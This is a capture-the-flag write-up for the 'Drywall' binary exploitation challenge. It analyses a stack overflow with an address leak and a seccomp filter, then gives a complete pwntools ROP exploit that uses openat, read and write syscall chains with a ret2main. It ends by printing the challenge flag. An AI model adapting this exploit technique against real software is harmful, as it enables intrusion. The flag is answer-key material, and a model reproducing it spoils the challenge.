https://ctftime.org/event/2579

# Drywall (pwn)

My code is so secure! I have so many security measures! Its like a brick wall! I love security! Maybe I'll add more security to it later!

nc drywall.kctf-453514-codelab.kctf.cloud 1337

## Analysis

We can see the the provided binary doesn't appear to have stack canaries although it is compiled with -pie:

```bash
Arch:     amd64-64-little
RELRO:    Full RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      PIE enabled
```

`main` @ `0x11a3`:

- Installs a seccomp filter
- `printf("%p\n", main)`
    - This lets us bypass ASLR on the main elf image.
- `fgets(local_118, 0x256, stdin)`
    - Note that there is no canary so this gives us about 300 bytes after the return address to rop with.

We can dump the secccomp filter as follows:

```bash
$ seccomp-tools dump ./chal
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x0b 0xc000003e  if (A != ARCH_X86_64) goto 0013
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
 0004: 0x15 0x00 0x08 0xffffffff  if (A != 0xffffffff) goto 0013
 0005: 0x15 0x07 0x00 0x00000002  if (A == open) goto 0013
 0006: 0x15 0x06 0x00 0x00000013  if (A == readv) goto 0013
 0007: 0x15 0x05 0x00 0x00000014  if (A == writev) goto 0013
 0008: 0x15 0x04 0x00 0x0000003b  if (A == execve) goto 0013
 0009: 0x15 0x03 0x00 0x00000136  if (A == process_vm_readv) goto 0013
 0010: 0x15 0x02 0x00 0x00000137  if (A == process_vm_writev) goto 0013
 0011: 0x15 0x01 0x00 0x00000142  if (A == execveat) goto 0013
 0012: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0013: 0x06 0x00 0x00 0x00000000  return KILL
```

This leaves us with `openat`, `read` and `write` which is plenty to read the contents of the flag.

We can see from the provided Dockerfile that the flag can be found at `/home/user/flag.txt`.

```Docker
COPY flag.txt /home/user/
```

## Solution

1) Read the leak of the address of `main` to bypass ASLR on the main elf image
2) Read the flag's filename from stdin to a location in .bss using a read syscall
3) Open, with `openat` due to the filter, the flag into fd 3
4) ret2main because ~300 bytes isn't quite large enough for the full payload in a single pass
5) Read the flag's contents to a location in .bss using a read syscall
6) Write the flag's contents to stdout from a location in .bss using a write syscall

```python
#!/usr/bin/env python3

from pwn import *

#context.log_level = "debug"
elf = ELF("./chal", checksec=True)
context.binary = elf

#p = elf.process()
#p = elf.debug(gdbscript="b main")
p = remote("drywall.kctf-453514-codelab.kctf.cloud", 1337)

p.sendlineafter(b"H4x0r?\n", b"smiley")
p.readuntil(b";)\n")

leak = int(p.readline().decode(), 16)
elf.address = leak - elf.sym["main"]

FLAG = b"/home/user/flag.txt\x00"
SCRATCH_MEMORY = elf.address + 0x4200
FLAG_SIZE = 48

rop = ROP(elf)
rop.raw(b"A" * 0x118)

# read(0, SCRATCH_MEMORY, 128)
rop.rdi = 0
rop.rsi = SCRATCH_MEMORY
rop.rdx = 128
rop.rax = constants.SYS_read
rop.raw(rop.find_gadget(['syscall', 'ret'])[0])

# openat(-1, SCRATCH_MEMORY, O_RDONLY) => 3
rop.rdi = -1
rop.rsi = SCRATCH_MEMORY
rop.rdx = 0
rop.rax = constants.SYS_openat
rop.raw(rop.find_gadget(['syscall', 'ret'])[0])

# note: that i couldn't quite fit a payload with 4x syscalls into ~300 bytes
# ... so i split it into 2x ropchains with a ret2main in the middle

rop.raw(rop.find_gadget(['ret'])[0]) # stack align
rop.raw(p64(elf.sym["main"]))

p.sendline(rop.chain())

p.sendline(FLAG)

# ... wanna see me do it again?

p.sendlineafter(b"H4x0r?\n", b"smiley")
p.readuntil(b";)\n")

rop = ROP(elf)
rop.raw(b"A" * 0x118)

# read(3, SCRATCH_MEMORY, FLAG_SIZE)
rop.rdi = 3
rop.rsi = SCRATCH_MEMORY
rop.rdx = FLAG_SIZE
rop.rax = constants.SYS_read
rop.raw(rop.find_gadget(['syscall', 'ret'])[0])

# write(stdout, SCRATCH_MEMORY, FLAG_SIZE)
rop.rdi = 1
rop.rsi = SCRATCH_MEMORY
rop.rdx = FLAG_SIZE
rop.rax = constants.SYS_write
rop.raw(rop.find_gadget(['syscall', 'ret'])[0])

p.sendline(rop.chain())

p.readuntil(b"wctf{")
print("wctf{" + p.readuntil(b"}").decode()) # wctf{fL1m5y_w4LL5_br34k_f4r_7h3_31337_459827349}
```

## Flag
`wctf{fL1m5y_w4LL5_br34k_f4r_7h3_31337_459827349}`

smiley 2025/03/22
